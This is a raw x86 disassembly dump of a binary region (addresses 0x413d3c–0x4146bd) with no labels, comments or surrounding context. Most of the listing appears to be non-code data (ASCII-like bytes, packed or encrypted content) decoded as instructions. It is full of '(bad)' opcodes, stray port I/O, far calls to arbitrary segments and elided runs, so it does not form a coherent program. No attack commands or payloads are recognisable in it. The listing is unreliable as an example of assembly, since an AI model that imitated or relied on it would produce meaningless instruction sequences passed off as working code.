  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	test   al,0xbb
  413f02:	repnz test eax,0xd1dc
  413f08:	add    eax,0x57000001
  413f0d:	mov    ebx,0x29c9feb3
  413f12:	je     0x413e96
  413f14:	pop    ebp
  413f15:	addr16 hlt 
  413f17:	dec    esp
  413f18:	xor    al,0x6e
  413f1a:	sub    cl,bh
  413f1c:	arpl   WORD PTR [esp+eax*1],cx
  413f1f:	imul   esp,eax,0xe0c6e6a1
  413f25:	pop    ebx
  413f26:	sub    ah,BYTE PTR [ecx+0x4f]
  413f29:	loope  0x413eb0
  413f2b:	leave  
  413f2c:	daa    
  413f2d:	mov    ebx,DWORD PTR [edx-0x428ca0b4]
  413f33:	xor    BYTE PTR [edx-0x3d95c982],bl
  413f39:	jns    0x413ee5
  413f3b:	hlt    
  413f3c:	mov    ch,0x58
  413f3e:	xchg   DWORD PTR [ebx+0x6399be5a],esp
  413f44:	retf   
  413f45:	stos   DWORD PTR es:[edi],eax
  413f46:	push   ebp
  413f47:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  413f49:	push   ecx
  413f4a:	test   BYTE PTR [eax],0x0
  413f4d:	mov    bh,BYTE PTR [edi]
  413f4f:	xchg   edx,eax
  413f50:	dec    esp
  413f51:	mov    cs,WORD PTR [eax+ebx*8-0x46bd0b8b]
  413f58:	lods   eax,DWORD PTR ds:[esi]
  413f59:	inc    edi
  413f5a:	sub    esi,ebp
  413f5c:	stc    
  413f5d:	addr16 aad 0x3d
  413f60:	enter  0x3778,0x13
  413f64:	jb     0x413f1a
  413f66:	jl     0x413f3f
  413f68:	adc    DWORD PTR [ebx],edi
  413f6a:	mov    ds,WORD PTR [edx]
  413f6c:	retf   
  413f6d:	xchg   bh,bh
  413f6f:	adc    ch,BYTE PTR [esi-0x6709652c]
  413f75:	scas   eax,DWORD PTR es:[edi]
  413f76:	xchg   esp,eax
  413f77:	cdq    
  413f78:	into   
  413f79:	leave  
  413f7a:	test   DWORD PTR [ecx-0x603e885a],edi
  413f80:	push   cs
  413f81:	mov    edi,0x815e37ee
  413f86:	add    BYTE PTR [edx+0x864cf9a],0xb5
  413f8d:	mov    esi,0x7b6bf65f
  413f92:	add    al,0x16
  413f94:	mov    cl,0x5a
  413f96:	jl     0x413f78
  413f98:	mov    ah,0x94
  413f9a:	mov    edi,0x9bb9316f
  413f9f:	in     eax,0x87
  413fa1:	jge    0x413fc6
  413fa3:	xlat   BYTE PTR ds:[ebx]
  413fa4:	out    0xde,eax
  413fa6:	and    eax,0xc60c3508
  413fab:	dec    eax
  413fac:	call   0xacc2:0x327862da
  413fb3:	sbb    BYTE PTR [edx+0x2e],0xac
  413fb7:	mov    ds:0xf37f0e29,eax
  413fbc:	idiv   BYTE PTR [ebp-0x734a741b]
  413fc2:	popa   
  413fc3:	push   esi
  413fc4:	mov    edi,0xb1e717d5
  413fc9:	fdiv   QWORD PTR [eax]
  413fcb:	rcl    DWORD PTR [ecx-0x1d513625],0xf0
  413fd2:	sub    al,bl
  413fd4:	out    0x4d,al
  413fd6:	sbb    esi,DWORD PTR [ecx+0x2f]
  413fd9:	cmp    BYTE PTR [edi+0x2f391304],bl
  413fdf:	add    BYTE PTR [edi+esi*1],al
  413fe2:	pop    esi
  413fe3:	mov    cl,0xdd
  413fe5:	sub    dl,BYTE PTR [esi-0xc]
  413fe8:	add    al,0xb8
  413fea:	xor    eax,0x71b23b6b
  413fef:	dec    ecx
  413ff0:	in     eax,dx
  413ff1:	cs jnp 0x414010
  413ff4:	cdq    
  413ff5:	pop    esi
  413ff6:	pushf  
  413ff7:	test   BYTE PTR [ecx-0x69],al
  413ffa:	xor    eax,0xe030f9
  413fff:	and    ah,bh
  414001:	inc    esi
  414002:	call   FWORD PTR [edx]
  414004:	xchg   edx,eax
  414005:	push   edi
  414006:	xchg   edx,eax
  414007:	neg    DWORD PTR [edx+0x4d922654]
  41400d:	bound  edi,QWORD PTR [edi+0x6d]
  414010:	sbb    al,0x0
	...
  414072:	add    BYTE PTR [eax],al
  414074:	pop    edx
  414075:	ficom  DWORD PTR [esi+0x60]
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0xb6fe:0xd3d52e96
  414083:	and    eax,0xd2e1
  414088:	add    eax,0x98000001
  41408d:	and    eax,0x7490d8a9
  414092:	add    al,0x3d
  414094:	loop   0x41401a
  414096:	rol    BYTE PTR ds:0x5f1ab27,0x3f
  41409d:	imul   eax,DWORD PTR [edx-0x24],0x7c2aa7c0
  4140a4:	cwde   
  4140a5:	jg     0x414037
  4140a7:	sub    DWORD PTR [esi-0x77359d72],edi
  4140ad:	out    0x20,eax
  4140af:	frstor [ecx-0x73]
  4140b2:	push   ebp
  4140b3:	mov    dl,BYTE PTR [edx]
  4140b5:	inc    ecx
  4140b6:	xchg   edx,eax
  4140b7:	xor    eax,0xf6569add
  4140bc:	imul   ebp,DWORD PTR [eax-0x31],0xfffffffd
  4140c0:	(bad)  
  4140c1:	pop    ds
  4140c2:	xor    al,0x68
  4140c4:	enter  0x606c,0xc6
  4140c8:	lds    ebp,FWORD PTR [edx]
  4140ca:	push   ss
  4140cb:	xor    eax,0x1b8515e9
  4140d0:	je     0x414106
  4140d2:	inc    edi
  4140d3:	mov    ds:0x38614aa,al
  4140d8:	imul   esi,eax,0x41efb18
  4140de:	or     edi,DWORD PTR [ebx]
  4140e0:	test   DWORD PTR [edx-0x2939d998],esp
  4140e6:	sub    dh,BYTE PTR [eax-0x15]
  4140e9:	rcl    edi,0x20
  4140ec:	push   ebp
  4140ed:	leave  
  4140ee:	push   eax
  4140ef:	out    0x71,eax
  4140f1:	retf   
  4140f2:	mov    DWORD PTR [ebx+0xd],eax
  4140f5:	inc    edi
  4140f6:	rcr    DWORD PTR [esi],0xc1
  4140f9:	fsubr  DWORD PTR [edi]
  4140fb:	dec    edi
  4140fc:	mov    ds:0xa1855894,eax
  414101:	mov    dh,0xb8
  414103:	jnp    0x41409e
  414105:	and    ch,BYTE PTR [ecx-0x5ce32b0f]
  41410b:	xor    BYTE PTR es:[esi+0x4a26c913],bh
  414112:	adc    ecx,DWORD PTR [ebx+0x5c]
  414115:	sar    DWORD PTR [edi+0x5b74b5e2],cl
  41411b:	les    ebp,FWORD PTR [edx-0x5]
  41411e:	cmp    al,0xa5
  414120:	bound  esi,QWORD PTR ds:0x3e78cf0d
  414126:	sub    al,0x85
  414128:	scas   al,BYTE PTR es:[edi]
  414129:	mov    ebx,DWORD PTR [edi+0x66af3488]
  41412f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414130:	into   
  414131:	adc    DWORD PTR [ecx-0x2ac0b0a2],ecx
  414137:	sub    ah,al
  414139:	sbb    DWORD PTR [esi+0x582670a2],0xfffffff0
  414140:	pop    esi
  414141:	xor    DWORD PTR [esi-0x3b38418c],esp
  414147:	or     DWORD PTR [esi-0x6d6066ae],ebp
  41414d:	mov    eax,0x498d351b
  414152:	xchg   ecx,eax
  414153:	pop    edx
  414154:	jl     0x4141a8
  414156:	xchg   ecx,eax
  414157:	ja     0x414154
  414159:	sub    eax,DWORD PTR [eax-0x14]
  41415c:	adc    esp,edi
  41415e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41415f:	scas   eax,DWORD PTR es:[edi]
  414160:	add    al,0x49
  414162:	mov    edi,0x2d7382c6
  414167:	lock in al,dx
  414169:	fdivr  QWORD PTR [ebx]
  41416b:	out    dx,eax
  41416c:	arpl   WORD PTR [edx+0x66a890d2],dx
  414172:	xchg   DWORD PTR [eax+0x3458b238],eax
  414178:	fbstp  TBYTE PTR [edi+0x16f65fab]
  41417e:	int3   
  41417f:	fdivrp st(4),st
  414181:	mov    ebx,esi
  414183:	mov    dl,0x64
  414185:	jle    0x4141a5
  414187:	enter  0x819f,0x8c
  41418b:	mov    ds:0xa6ab4256,al
  414190:	dec    esi
	...
  4141f1:	add    BYTE PTR [eax],al
  4141f3:	add    BYTE PTR [edx],al
  4141f5:	adc    al,BYTE PTR [ecx]
  4141f7:	mov    ds:0xb3a2b311,eax
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	mov    ds:0xe60278f7,eax
  414205:	rol    DWORD PTR [eax],cl
  414207:	add    BYTE PTR ds:0x2f000001,al
  41420d:	sbb    eax,0x19b8788d
  414212:	dec    edx
  414213:	in     al,dx
  414214:	adc    ch,BYTE PTR [eax]
  414216:	mov    WORD PTR [eax+0x46],?
  414219:	push   0x98c80e8d
  41421e:	aas    
  41421f:	imul   eax,eax,0x67
  414222:	cwde   
  414223:	aad    0x2e
  414225:	sbb    eax,0x378627b4
  41422a:	in     eax,0xd8
  41422c:	jg     0x4141b4
  41422e:	stos   DWORD PTR es:[edi],eax
  41422f:	inc    ebx
  414230:	xor    al,0x65
  414232:	ins    BYTE PTR es:[edi],dx
  414233:	aam    0x98
  414235:	je     0x41429e
  414237:	test   DWORD PTR cs:[eax-0x45bef494],0xd6e515fc
  414242:	fidiv  WORD PTR [ecx+0x6f]
  414245:	xchg   edx,eax
  414246:	pop    edi
  414247:	add    eax,0x787c6307
  41424c:	mov    dh,0x9d
  41424e:	out    0x5,eax
  414250:	mov    eax,ds:0x3da73256
  414255:	push   ss
  414256:	ret    0x740d
  414259:	hlt    
  41425a:	ins    BYTE PTR es:[edi],dx
  41425b:	fidivr WORD PTR [edi-0x1d]
  41425f:	xor    eax,0x9be593ad
  414264:	imul   edx,esi,0xc675d798
  41426a:	pop    ebp
  41426b:	jg     0x414278
  41426d:	add    BYTE PTR [eax-0x60],dh
  414270:	cmp    eax,edi
  414272:	(bad)  
  414273:	in     eax,dx
  414274:	inc    ecx
  414275:	xor    bl,dl
  414277:	add    esp,edi
  414279:	js     0x4142e9
  41427b:	lea    esp,[edi-0x73444eca]
  414281:	in     eax,dx
  414282:	pop    eax
  414283:	jnp    0x4142cd
  414285:	add    dl,bh
  414287:	jl     0x41423a
  414289:	sub    esi,esp
  41428b:	pushf  
  41428c:	aam    0x1
  41428e:	and    BYTE PTR [eax-0x10855570],ah
  414294:	pop    ebx
  414295:	mov    edi,0x58fa72af
  41429a:	pop    ebp
  41429b:	sbb    al,0x17
  41429d:	out    0x41,al
  41429f:	retf   
  4142a0:	push   es
  4142a1:	repnz imul edx,DWORD PTR [eax],0xff7c65d8
  4142a8:	stos   DWORD PTR es:[edi],eax
  4142a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142aa:	jl     0x4142e6
  4142ac:	(bad)  
  4142ad:	hlt    
  4142ae:	in     al,dx
  4142af:	and    DWORD PTR [ecx],0x63254547
  4142b5:	mov    DWORD PTR [edx],edx
  4142b7:	xor    bh,BYTE PTR [edi+0x7268f7c0]
  4142bd:	frstor [ecx]
  4142bf:	dec    ebp
  4142c0:	xchg   ebx,eax
  4142c1:	inc    esp
  4142c2:	cmp    edx,DWORD PTR [edi-0x17]
  4142c5:	call   0x9afb8270
  4142ca:	cs cmp al,0x8c
  4142cd:	xchg   ebp,ebp
  4142cf:	fld    DWORD PTR [ebp+ebx*1+0x1c]
  4142d3:	jp     0x4142f4
  4142d5:	xchg   ecx,eax
  4142d6:	mov    bh,BYTE PTR [edx+0x34]
  4142d9:	fidivr WORD PTR [esi+0x79]
  4142dc:	push   edi
  4142dd:	mov    eax,ds:0x4040bf51
  4142e2:	xchg   ebx,eax
  4142e3:	sbb    eax,0x8a8919a9
  4142e8:	mov    edx,0x45db5113
  4142ed:	stc    
  4142ee:	push   0xdf0eb351
  4142f3:	clc    
  4142f4:	xchg   ecx,eax
  4142f5:	xchg   ecx,eax
  4142f6:	(bad)
  4142f9:	cmp    BYTE PTR [ecx-0x42],ch
  4142fc:	push   ds
  4142fd:	ret    0xa26c
  414300:	jge    0x4142ec
  414302:	dec    edi
  414303:	outs   dx,BYTE PTR ds:[esi]
  414304:	and    DWORD PTR [ecx],ecx
  414306:	pop    edi
  414307:	and    dl,bl
  414309:	sbb    dl,0x24
  41430c:	jo     0x4142c0
  41430e:	or     eax,0x32ea
	...
  414373:	add    BYTE PTR [ecx],al
  414375:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	inc    ecx
  414381:	push   es
  414382:	and    ah,al
  414384:	jmp    0x41435a
  414386:	add    BYTE PTR [eax],al
  414388:	add    eax,0xb5000001
  41438d:	mov    DWORD PTR [edx],esi
  41438f:	(bad)  
  414390:	sbb    ecx,DWORD PTR [ecx]
  414392:	push   eax
  414393:	cmp    esp,DWORD PTR [esp+edx*8]
  414396:	or     ebp,DWORD PTR [esi]
  414398:	stos   DWORD PTR es:[edi],eax
  414399:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41439a:	mov    edi,0x8b69ea4c
  41439f:	in     eax,dx
  4143a0:	dec    eax
  4143a1:	sbb    eax,0x1782a4ed
  4143a7:	jg     0x414405
  4143a9:	lahf   
  4143aa:	add    al,0xbe
  4143ac:	int    0x94
  4143ae:	cmp    al,0x61
  4143b0:	das    
  4143b1:	fistp  DWORD PTR [esi+0x270d1671]
  4143b7:	inc    ebp
  4143b8:	retf   
  4143b9:	pop    esi
  4143ba:	sar    ebp,1
  4143bc:	enter  0x7082,0x3d
  4143c0:	xchg   bl,dl
  4143c2:	ret    
  4143c3:	push   esi
  4143c4:	cmp    DWORD PTR [ebx],edx
  4143c6:	sbb    dh,bl
  4143c8:	sar    BYTE PTR ds:0xfa0dc8e0,1
  4143ce:	jns    0x41438e
  4143d0:	push   ss
  4143d1:	and    al,bh
  4143d3:	popa   
  4143d4:	lods   eax,DWORD PTR ds:[esi]
  4143d5:	or     BYTE PTR [esi+ebp*8],ah
  4143d8:	dec    edi
  4143d9:	scas   al,BYTE PTR es:[edi]
  4143da:	cmp    ch,BYTE PTR [edx-0x71576e3e]
  4143e0:	push   ebp
  4143e1:	add    esp,DWORD PTR [ebx+edx*2+0x42942830]
  4143e8:	xchg   edi,eax
  4143e9:	sti    
  4143ea:	out    dx,al
  4143eb:	retf   
  4143ec:	sub    eax,0xbca46238
  4143f1:	cs pop ds
  4143f3:	cmp    eax,0x78072819
  4143f8:	pop    esp
  4143f9:	push   esi
  4143fa:	shl    BYTE PTR [ebx-0x19a171cb],cl
  414400:	jp     0x4143ab
  414402:	mov    bh,0xbc
  414404:	or     DWORD PTR [edi-0x74],ecx
  414407:	xchg   esi,eax
  414408:	retf   0xb77
  41440b:	jmp    0xb8bb:0x519f29ee
  414412:	jne    0x414399
  414414:	and    esi,eax
  414416:	rcl    DWORD PTR ds:0x6fd2b3b8,1
  41441c:	popa   
  41441d:	not    BYTE PTR [edi]
  41441f:	mov    al,ds:0x8e88c823
  414424:	std    
  414425:	pushf  
  414426:	shr    BYTE PTR [edx-0x7f],1
  414429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41442a:	addr16 pop ebx
  41442c:	inc    ecx
  41442d:	mov    ebx,0xc68db0a5
  414432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414433:	jp     0x414495
  414435:	(bad)  
  414436:	dec    esi
  414437:	rcr    DWORD PTR [esi-0xa],cl
  41443a:	jmp    0x4143c0
  41443c:	repz cmc 
  41443e:	popf   
  41443f:	xor    eax,0xd269645b
  414444:	jns    0x414464
  414446:	stos   DWORD PTR es:[edi],eax
  414447:	jbe    0x41447f
  414449:	mov    ds:0x17198db6,eax
  41444e:	retf   0xe711
  414451:	cmp    al,0xf2
  414453:	xor    cl,BYTE PTR [eax+0x104088c]
  414459:	nop
  41445a:	jg     0x4143f1
  41445c:	mov    bl,0xcc
  41445e:	push   ss
  41445f:	adc    bh,dl
  414461:	mov    ds,WORD PTR ds:0xd580a1d2
  414467:	ins    BYTE PTR es:[edi],dx
  414468:	(bad)  
  414469:	aas    
  41446a:	in     al,dx
  41446b:	les    edx,FWORD PTR [edx]
  41446d:	call   DWORD PTR [edi-0x5d1beac6]
  414473:	ins    DWORD PTR es:[edi],dx
  414474:	or     ah,dh
  414476:	sbb    al,0x58
  414478:	cmp    DWORD PTR [edx-0x42],ecx
  41447b:	xor    eax,0x675b22a6
  414480:	add    BYTE PTR [esi+0x1168d9fc],bl
  414486:	stos   DWORD PTR es:[edi],eax
  414487:	rcr    ch,1
  414489:	cld    
  41448a:	and    eax,0xdebabbe6
  41448f:	in     eax,0x5b
	...
  4144f1:	add    BYTE PTR [eax],al
  4144f3:	add    BYTE PTR [ebx+0x73],bl
  4144f6:	inc    edx
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi+0x74]
  414501:	jb     0x414539
  414503:	aas    
  414504:	lock aad 0x0
  414507:	add    BYTE PTR ds:0x82000001,al
  41450d:	ret    0xe8d6
  414510:	fpatan 
  414512:	fdivr  QWORD PTR [eax+0x5ad195ef]
  414518:	sub    ebp,DWORD PTR [ecx]
  41451a:	loop   0x41458a
  41451c:	dec    eax
  41451d:	cmp    al,0xe7
  41451f:	pop    ds
  414520:	xor    ecx,DWORD PTR [eax]
  414522:	daa    
  414523:	fld    DWORD PTR [ebx+0x25]
  414526:	and    al,0x1
  414528:	jmp    0x53833afa
  41452d:	sbb    edi,DWORD PTR [edi]
  41452f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414530:	mov    ds,WORD PTR [edi+0x6d45312a]
  414536:	ficomp DWORD PTR [esp+ebx*4]
  414539:	popa   
  41453a:	scas   eax,DWORD PTR es:[edi]
  41453b:	add    edi,DWORD PTR [edi+0xa566148]
  414541:	fisub  DWORD PTR [edx]
  414543:	out    dx,al
  414544:	mov    ch,BYTE PTR [ebp+0x2e27084e]
  41454a:	enter  0x9655,0x8
  41454e:	stc    
  41454f:	inc    edx
  414550:	out    0xc0,eax
  414552:	inc    esi
  414553:	inc    ebx
  414554:	(bad)  
  414558:	jae    0x4144e7
  41455a:	inc    esi
  41455b:	pusha  
  41455c:	scas   al,BYTE PTR es:[edi]
  41455d:	data16 fcom DWORD PTR [eax+0x6c7d8c87]
  414564:	push   es
  414565:	fild   DWORD PTR [ebp-0x794209fb]
  41456b:	fsubp  st(5),st
  41456d:	dec    ebp
  41456e:	daa    
  41456f:	into   
  414570:	loop   0x414556
  414572:	stc    
  414573:	repnz pushf 
  414575:	out    dx,eax
  414576:	dec    ebx
  414577:	fistp  WORD PTR [ebp-0x2c]
  41457a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41457b:	xchg   ebx,eax
  41457c:	dec    ebp
  41457d:	int3   
  41457e:	jae    0x414593
  414580:	or     DWORD PTR [edx+0x2d],ebx
  414583:	push   ecx
  414584:	xor    cl,BYTE PTR [edx]
  414586:	clc    
  414587:	adc    ah,BYTE PTR [ebx+0x3a96c867]
  41458d:	sub    DWORD PTR [ebx-0x7],edx
  414590:	push   ebx
  414591:	inc    ebx
  414592:	add    dh,dh
  414594:	test   DWORD PTR [ebx+0x58],0xc37455b2
  41459b:	pop    edi
  41459c:	mov    dl,0x1f
  41459e:	dec    ebx
  41459f:	out    0x56,al
  4145a1:	outs   dx,BYTE PTR ds:[esi]
  4145a2:	ret    
  4145a3:	inc    ecx
  4145a4:	lods   eax,DWORD PTR ds:[esi]
  4145a5:	pushf  
  4145a6:	jp     0x41457f
  4145a8:	lock and al,0xaa
  4145ab:	dec    esi
  4145ac:	dec    edi
  4145ad:	and    eax,0xd36507e6
  4145b2:	sub    al,0xd4
  4145b4:	push   ss
  4145b5:	dec    ebx
  4145b6:	pusha  
  4145b7:	adc    BYTE PTR ds:0x55af01a0,bh
  4145bd:	repnz retf 0xa25c
  4145c1:	push   0x47
  4145c3:	sub    al,0x21
  4145c5:	ret    0x6c0b
  4145c8:	add    si,WORD PTR ds:[ebx+0x1e]
  4145cd:	pop    edi
  4145ce:	ja     0x4145a5
  4145d0:	aad    0x36
  4145d2:	fwait
  4145d3:	cli    
  4145d4:	loopne 0x414564
  4145d6:	repz shr ah,0x91
  4145da:	lods   al,BYTE PTR ds:[esi]
  4145db:	inc    edx
  4145dc:	jmp    FWORD PTR [edi+eiz*1-0x28361f7d]
  4145e3:	aam    0x8a
  4145e5:	mov    ebx,DWORD PTR [ebp+eax*2+0x402c4335]
  4145ec:	jne    0x4145fb
  4145ee:	ficomp WORD PTR [ebp-0x51]
  4145f1:	sbb    BYTE PTR [edi],al
  4145f3:	shl    BYTE PTR [eax+edx*8-0x5cca1dfa],cl
  4145fa:	and    ebx,DWORD PTR [ecx-0x4c6640a2]
  414600:	daa    
  414601:	dec    esp
  414602:	or     DWORD PTR [eax+0xf2e7d0a],ecx
  414608:	xor    BYTE PTR [ebx+0x64],bh
  41460b:	imul   ebx,DWORD PTR [edx+0x12],0x8d0d33
	...
  414672:	add    BYTE PTR [eax],al
  414674:	jg     0x4146d4
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0xcc
  414681:	mul    BYTE PTR fs:[eax]
  414684:	cmc    
  414685:	(bad)  
  414686:	add    BYTE PTR [eax],al
  414688:	add    eax,0x4b000001
  41468d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41468e:	sub    al,0x7d
  414690:	pop    ds
  414691:	jne    0x414633
  414693:	push   edx
  414694:	sub    edi,DWORD PTR [eax]
  414696:	mov    dl,0xee
  414698:	push   ebx
  414699:	ds aad 0xf5
  41469c:	mov    ah,BYTE PTR [ebp+0x5ba1cb6c]
  4146a2:	in     eax,dx
  4146a3:	dec    ecx
  4146a4:	or     al,bl
  4146a6:	cmp    ebp,eax
  4146a8:	sbb    al,0x6a
  4146aa:	pusha  
  4146ab:	push   eax
  4146ac:	sti    
  4146ad:	out    dx,eax
  4146ae:	dec    edi
  4146af:	aad    0x54
  4146b1:	pop    edx
  4146b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146b3:	mov    esi,0x94b02c94
  4146b8:	mov    bl,BYTE PTR [ecx+0x55]
  4146bb:	daa    
  4146bc:	pusha  
  4146bd:	sub    dh,bh
